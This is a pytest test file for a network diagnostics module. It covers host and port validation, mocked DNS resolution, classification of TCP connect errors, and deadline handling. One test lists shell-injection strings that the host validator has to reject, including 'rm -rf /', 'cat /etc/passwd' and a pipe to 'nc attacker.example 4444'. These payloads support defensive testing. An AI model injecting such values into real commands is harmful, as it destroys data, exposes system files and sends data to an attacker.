"""Tests for mantis.integrations.network: host/port validation, DNS
resolution mechanics, and the bounded, deadline-aware TCP connect loop.

All resolver/socket behavior is mocked via monkeypatching the module's
own `_resolve`/`_connect` seams — no real DNS or network access, and no
test sleeps in real time (latency is measured with an injectable clock).
"""

from __future__ import annotations

import errno
import socket

import pytest

from mantis.integrations import network
from mantis.reliability import Deadline
from mantis.integrations.network import (
    MAX_ADDRESSES_ATTEMPTED,
    AddressAttempt,
    ConnectStatus,
    HostValidationError,
    PortValidationError,
    check_tcp_connect,
    validate_host,
    validate_port,
)


class FakeClock:
    def __init__(self, start: float = 0.0) -> None:
        self.now = start

    def __call__(self) -> float:
        return self.now

    def advance(self, seconds: float) -> None:
        self.now += seconds


# ---------------------------------------------------------------------------
# validate_host
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "host",
    ["host03", "example.com", "sub.example.com", "host-03", "a", "192.168.1.1", "::1", "2001:db8::1"],
)
def test_validate_host_accepts_valid_values(host):
    assert validate_host(host) == host


@pytest.mark.parametrize(
    "host,reason",
    [
        ("http://host03", "scheme"),
        ("https://host03:8080", "scheme"),
        ("host03/path", "path"),
        ("host03\\path", "path"),
        ("user:pass@host03", "credentials"),
        ("host 03", "whitespace"),
        ("host\t03", "whitespace"),
        ("host\n03", "control"),
        ("host\x0003", "control"),
        ("", "empty"),
        ("a" * 254, "too long"),
        (123, "not a string"),
        (None, "not a string"),
    ],
)
def test_validate_host_rejects_invalid_values(host, reason):
    with pytest.raises(HostValidationError):
        validate_host(host)


@pytest.mark.parametrize(
    "payload",
    [
        "host; rm -rf /",
        "host && cat /etc/passwd",
        "host | nc attacker.example 4444",
        "host`whoami`",
        "host$(whoami)",
        "host > /tmp/x",
    ],
)
def test_validate_host_rejects_shell_metacharacter_payloads(payload):
    with pytest.raises(HostValidationError):
        validate_host(payload)


def test_validate_host_allows_private_addresses():
    # Mantis is meant to troubleshoot private infrastructure -- no
    # broad SSRF-style private-IP blocking.
    for host in ("10.0.0.5", "192.168.1.1", "172.16.0.1", "127.0.0.1", "fc00::1", "localhost"):
        assert validate_host(host) == host


# ---------------------------------------------------------------------------
# validate_port
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("port", [1, 22, 443, 8080, 65535])
def test_validate_port_accepts_valid_values(port):
    assert validate_port(port) == port


@pytest.mark.parametrize("port", [0, -1, 65536, 100000, "22", 22.0, True, False, None])
def test_validate_port_rejects_invalid_values(port):
    with pytest.raises(PortValidationError):
        validate_port(port)


# ---------------------------------------------------------------------------
# DNS resolution (mocked _resolve)
# ---------------------------------------------------------------------------


def _addrinfo(family, address, port=22):
    sockaddr = (address, port) if family == socket.AF_INET else (address, port, 0, 0)
    return (family, socket.SOCK_STREAM, 6, "", sockaddr)


def test_gaierror_classified_as_dns_failure(monkeypatch):
    def fake_resolve(host, port):
        raise socket.gaierror("Name or service not known")

    monkeypatch.setattr(network, "_resolve", fake_resolve)

    result = check_tcp_connect("no-such-host.invalid", 22)

    assert result.status == ConnectStatus.DNS_FAILURE.value
    assert result.connected is False
    assert result.attempts == []


def test_large_resolver_result_is_capped(monkeypatch):
    infos = [_addrinfo(socket.AF_INET, f"10.0.0.{i}") for i in range(20)]
    monkeypatch.setattr(network, "_resolve", lambda host, port: infos)
    monkeypatch.setattr(
        network,
        "_connect",
        lambda family, sockaddr, *, timeout_seconds: (_ for _ in ()).throw(
            OSError(errno.ECONNREFUSED, "refused")
        ),
    )

    result = check_tcp_connect("many.example", 22)

    assert len(result.attempts) == MAX_ADDRESSES_ATTEMPTED
    assert result.truncated is True


def test_duplicate_resolved_addresses_are_deduplicated(monkeypatch):
    infos = [
        _addrinfo(socket.AF_INET, "10.0.0.1"),
        _addrinfo(socket.AF_INET, "10.0.0.1"),
        _addrinfo(socket.AF_INET, "10.0.0.2"),
    ]
    monkeypatch.setattr(network, "_resolve", lambda host, port: infos)
    seen_addresses = []

    def fake_connect(family, sockaddr, *, timeout_seconds):
        seen_addresses.append(sockaddr[0])
        raise OSError(errno.ECONNREFUSED, "refused")

    monkeypatch.setattr(network, "_connect", fake_connect)

    result = check_tcp_connect("dup.example", 22)

    assert seen_addresses == ["10.0.0.1", "10.0.0.2"]
    assert len(result.attempts) == 2


def test_ipv4_and_ipv6_candidates_both_preserved(monkeypatch):
    infos = [_addrinfo(socket.AF_INET6, "2001:db8::1"), _addrinfo(socket.AF_INET, "10.0.0.1")]
    monkeypatch.setattr(network, "_resolve", lambda host, port: infos)
    monkeypatch.setattr(
        network,
        "_connect",
        lambda family, sockaddr, *, timeout_seconds: (_ for _ in ()).throw(
            OSError(errno.ECONNREFUSED, "refused")
        ),
    )

    result = check_tcp_connect("dual.example", 22)

    families = [a.address_family for a in result.attempts]
    assert families == ["ipv6", "ipv4"]


def test_empty_resolver_result_is_dns_failure(monkeypatch):
    monkeypatch.setattr(network, "_resolve", lambda host, port: [])

    result = check_tcp_connect("nowhere.example", 22)

    assert result.status == ConnectStatus.DNS_FAILURE.value


# ---------------------------------------------------------------------------
# TCP connect classification
# ---------------------------------------------------------------------------


def _single_address(monkeypatch, family=socket.AF_INET, address="10.0.0.1"):
    monkeypatch.setattr(network, "_resolve", lambda host, port: [_addrinfo(family, address)])


def test_successful_connect(monkeypatch):
    _single_address(monkeypatch)
    monkeypatch.setattr(network, "_connect", lambda family, sockaddr, *, timeout_seconds: None)

    result = check_tcp_connect("host.example", 22)

    assert result.status == ConnectStatus.CONNECTED.value
    assert result.connected is True
    assert result.resolved_address == "10.0.0.1"
    assert result.address_family == "ipv4"
    assert len(result.attempts) == 1
    assert result.attempts[0].status == ConnectStatus.CONNECTED.value


def test_socket_timeout_classified_as_timeout(monkeypatch):
    _single_address(monkeypatch)

    def fake_connect(family, sockaddr, *, timeout_seconds):
        raise socket.timeout("timed out")

    monkeypatch.setattr(network, "_connect", fake_connect)

    result = check_tcp_connect("host.example", 22)

    assert result.status == ConnectStatus.TIMEOUT.value
    assert result.attempts[0].status == ConnectStatus.TIMEOUT.value


def test_econnrefused_classified_as_connection_refused(monkeypatch):
    _single_address(monkeypatch)

    def fake_connect(family, sockaddr, *, timeout_seconds):
        raise OSError(errno.ECONNREFUSED, "Connection refused")

    monkeypatch.setattr(network, "_connect", fake_connect)

    result = check_tcp_connect("host.example", 22)

    assert result.status == ConnectStatus.CONNECTION_REFUSED.value
    assert result.attempts[0].errno == errno.ECONNREFUSED


def test_enetunreach_classified_as_network_unreachable(monkeypatch):
    _single_address(monkeypatch)

    def fake_connect(family, sockaddr, *, timeout_seconds):
        raise OSError(errno.ENETUNREACH, "Network unreachable")

    monkeypatch.setattr(network, "_connect", fake_connect)

    result = check_tcp_connect("host.example", 22)

    assert result.status == ConnectStatus.NETWORK_UNREACHABLE.value


def test_ehostunreach_classified_as_host_unreachable(monkeypatch):
    _single_address(monkeypatch)

    def fake_connect(family, sockaddr, *, timeout_seconds):
        raise OSError(errno.EHOSTUNREACH, "No route to host")

    monkeypatch.setattr(network, "_connect", fake_connect)

    result = check_tcp_connect("host.example", 22)

    assert result.status == ConnectStatus.HOST_UNREACHABLE.value


def test_unknown_oserror_classified_as_connection_error(monkeypatch):
    _single_address(monkeypatch)

    def fake_connect(family, sockaddr, *, timeout_seconds):
        raise OSError(errno.EACCES, "Permission denied")

    monkeypatch.setattr(network, "_connect", fake_connect)

    result = check_tcp_connect("host.example", 22)

    assert result.status == ConnectStatus.CONNECTION_ERROR.value


# ---------------------------------------------------------------------------
# Multi-address semantics
# ---------------------------------------------------------------------------


def test_first_address_fails_later_address_succeeds(monkeypatch):
    infos = [_addrinfo(socket.AF_INET6, "2001:db8::1"), _addrinfo(socket.AF_INET, "10.0.0.1")]
    monkeypatch.setattr(network, "_resolve", lambda host, port: infos)

    def fake_connect(family, sockaddr, *, timeout_seconds):
        if family == socket.AF_INET6:
            raise OSError(errno.ENETUNREACH, "Network unreachable")
        return None

    monkeypatch.setattr(network, "_connect", fake_connect)

    result = check_tcp_connect("dual.example", 22)

    assert result.status == ConnectStatus.CONNECTED.value
    assert result.connected is True
    assert result.address_family == "ipv4"
    # Stopped immediately on first success -- the IPv6 attempt is
    # recorded, but connect() was never retried against it again.
    assert len(result.attempts) == 2
    assert result.attempts[0].status == ConnectStatus.NETWORK_UNREACHABLE.value
    assert result.attempts[1].status == ConnectStatus.CONNECTED.value


def test_all_addresses_fail_returns_per_address_evidence_and_overall_status(monkeypatch):
    infos = [_addrinfo(socket.AF_INET, "10.0.0.1"), _addrinfo(socket.AF_INET, "10.0.0.2")]
    monkeypatch.setattr(network, "_resolve", lambda host, port: infos)
    responses = iter(
        [OSError(errno.ETIMEDOUT, "timed out"), OSError(errno.ECONNREFUSED, "refused")]
    )

    def fake_connect(family, sockaddr, *, timeout_seconds):
        raise next(responses)

    monkeypatch.setattr(network, "_connect", fake_connect)

    result = check_tcp_connect("multi.example", 22)

    assert result.connected is False
    assert len(result.attempts) == 2
    statuses = {a.status for a in result.attempts}
    assert statuses == {ConnectStatus.TIMEOUT.value, ConnectStatus.CONNECTION_REFUSED.value}


@pytest.mark.parametrize(
    "first_errno,second_errno,expected",
    [
        (errno.ETIMEDOUT, errno.ECONNREFUSED, ConnectStatus.CONNECTION_REFUSED.value),
        (errno.ECONNREFUSED, errno.ETIMEDOUT, ConnectStatus.CONNECTION_REFUSED.value),
        (errno.ENETUNREACH, errno.ECONNREFUSED, ConnectStatus.NETWORK_UNREACHABLE.value),
        (errno.ECONNREFUSED, errno.ENETUNREACH, ConnectStatus.NETWORK_UNREACHABLE.value),
        (errno.EHOSTUNREACH, errno.ENETUNREACH, ConnectStatus.HOST_UNREACHABLE.value),
        (errno.ENETUNREACH, errno.EHOSTUNREACH, ConnectStatus.HOST_UNREACHABLE.value),
    ],
)
def test_overall_status_precedence_is_deterministic_regardless_of_order(
    monkeypatch, first_errno, second_errno, expected
):
    infos = [_addrinfo(socket.AF_INET, "10.0.0.1"), _addrinfo(socket.AF_INET, "10.0.0.2")]
    monkeypatch.setattr(network, "_resolve", lambda host, port: infos)
    responses = iter([OSError(first_errno, "x"), OSError(second_errno, "y")])
    monkeypatch.setattr(
        network, "_connect", lambda family, sockaddr, *, timeout_seconds: (_ for _ in ()).throw(next(responses))
    )

    result = check_tcp_connect("order.example", 22)

    assert result.status == expected


def test_attempt_cap_honored_when_more_candidates_exist(monkeypatch):
    infos = [_addrinfo(socket.AF_INET, f"10.0.0.{i}") for i in range(MAX_ADDRESSES_ATTEMPTED + 3)]
    monkeypatch.setattr(network, "_resolve", lambda host, port: infos)
    call_count = {"n": 0}

    def fake_connect(family, sockaddr, *, timeout_seconds):
        call_count["n"] += 1
        raise OSError(errno.ECONNREFUSED, "refused")

    monkeypatch.setattr(network, "_connect", fake_connect)

    check_tcp_connect("many.example", 22)

    assert call_count["n"] == MAX_ADDRESSES_ATTEMPTED


def test_same_address_is_never_attempted_twice(monkeypatch):
    infos = [_addrinfo(socket.AF_INET, "10.0.0.1")]
    monkeypatch.setattr(network, "_resolve", lambda host, port: infos)
    call_count = {"n": 0}

    def fake_connect(family, sockaddr, *, timeout_seconds):
        call_count["n"] += 1
        raise OSError(errno.ECONNREFUSED, "refused")

    monkeypatch.setattr(network, "_connect", fake_connect)

    check_tcp_connect("single.example", 22)

    assert call_count["n"] == 1


# ---------------------------------------------------------------------------
# Deadline semantics
# ---------------------------------------------------------------------------


def test_already_expired_deadline_means_zero_connect_attempts(monkeypatch):
    resolve_called = {"n": 0}
    monkeypatch.setattr(
        network, "_resolve", lambda host, port: resolve_called.update(n=resolve_called["n"] + 1) or []
    )
    connect_called = {"n": 0}
    monkeypatch.setattr(
        network, "_connect", lambda family, sockaddr, *, timeout_seconds: connect_called.update(n=connect_called["n"] + 1)
    )
    clock = FakeClock()
    deadline = Deadline.after(0.0, clock=clock)

    result = check_tcp_connect("host.example", 22, deadline=deadline)

    assert result.status == ConnectStatus.BUDGET_EXCEEDED.value
    assert result.attempts == []
    assert connect_called["n"] == 0
    # Resolution isn't even attempted once the deadline is already gone.
    assert resolve_called["n"] == 0


def test_deadline_exhausted_after_one_candidate_stops_later_candidates(monkeypatch):
    infos = [_addrinfo(socket.AF_INET, "10.0.0.1"), _addrinfo(socket.AF_INET, "10.0.0.2")]
    monkeypatch.setattr(network, "_resolve", lambda host, port: infos)
    clock = FakeClock()
    deadline = Deadline.after(1.0, clock=clock)
    call_count = {"n": 0}

    def fake_connect(family, sockaddr, *, timeout_seconds):
        call_count["n"] += 1
        clock.advance(10.0)  # consumes the whole remaining deadline
        raise OSError(errno.ECONNREFUSED, "refused")

    monkeypatch.setattr(network, "_connect", fake_connect)

    result = check_tcp_connect("host.example", 22, deadline=deadline, clock=clock)

    assert call_count["n"] == 1
    assert len(result.attempts) == 1
    assert result.truncated is True


def test_socket_timeout_is_capped_by_remaining_deadline(monkeypatch):
    infos = [_addrinfo(socket.AF_INET, "10.0.0.1")]
    monkeypatch.setattr(network, "_resolve", lambda host, port: infos)
    clock = FakeClock()
    deadline = Deadline.after(2.0, clock=clock)
    captured_timeout = {}

    def fake_connect(family, sockaddr, *, timeout_seconds):
        captured_timeout["value"] = timeout_seconds
        raise OSError(errno.ECONNREFUSED, "refused")

    monkeypatch.setattr(network, "_connect", fake_connect)

    check_tcp_connect("host.example", 22, deadline=deadline, clock=clock)

    # DEFAULT_CONNECT_TIMEOUT_SECONDS is 5.0 -- capped down to the 2.0s
    # remaining budget.
    assert captured_timeout["value"] == pytest.approx(2.0, abs=0.01)


def test_socket_timeout_uses_default_when_deadline_is_generous(monkeypatch):
    infos = [_addrinfo(socket.AF_INET, "10.0.0.1")]
    monkeypatch.setattr(network, "_resolve", lambda host, port: infos)
    clock = FakeClock()
    deadline = Deadline.after(300.0, clock=clock)
    captured_timeout = {}

    def fake_connect(family, sockaddr, *, timeout_seconds):
        captured_timeout["value"] = timeout_seconds
        raise OSError(errno.ECONNREFUSED, "refused")

    monkeypatch.setattr(network, "_connect", fake_connect)

    check_tcp_connect("host.example", 22, deadline=deadline, clock=clock)

    assert captured_timeout["value"] == network.DEFAULT_CONNECT_TIMEOUT_SECONDS


def test_latency_measured_with_injectable_clock(monkeypatch):
    infos = [_addrinfo(socket.AF_INET, "10.0.0.1")]
    monkeypatch.setattr(network, "_resolve", lambda host, port: infos)
    clock = FakeClock()

    def fake_connect(family, sockaddr, *, timeout_seconds):
        clock.advance(0.25)

    monkeypatch.setattr(network, "_connect", fake_connect)

    result = check_tcp_connect("host.example", 22, clock=clock)

    assert result.latency_ms == pytest.approx(250.0, abs=0.5)


# ---------------------------------------------------------------------------
# Attempt evidence bounding
# ---------------------------------------------------------------------------


def test_attempt_message_is_bounded_not_a_giant_exception_repr(monkeypatch):
    _single_address(monkeypatch)
    huge_message = "x" * 5000

    def fake_connect(family, sockaddr, *, timeout_seconds):
        raise OSError(errno.ECONNREFUSED, huge_message)

    monkeypatch.setattr(network, "_connect", fake_connect)

    result = check_tcp_connect("host.example", 22)

    assert len(result.attempts[0].message) <= network.MAX_ATTEMPT_MESSAGE_CHARS + len("...")


def test_address_attempt_to_dict_shape():
    attempt = AddressAttempt(
        address="10.0.0.1",
        address_family="ipv4",
        status="connected",
        errno=None,
        latency_ms=1.23,
        message=None,
    )
    assert attempt.to_dict() == {
        "address": "10.0.0.1",
        "address_family": "ipv4",
        "status": "connected",
        "errno": None,
        "latency_ms": 1.23,
        "message": None,
    }
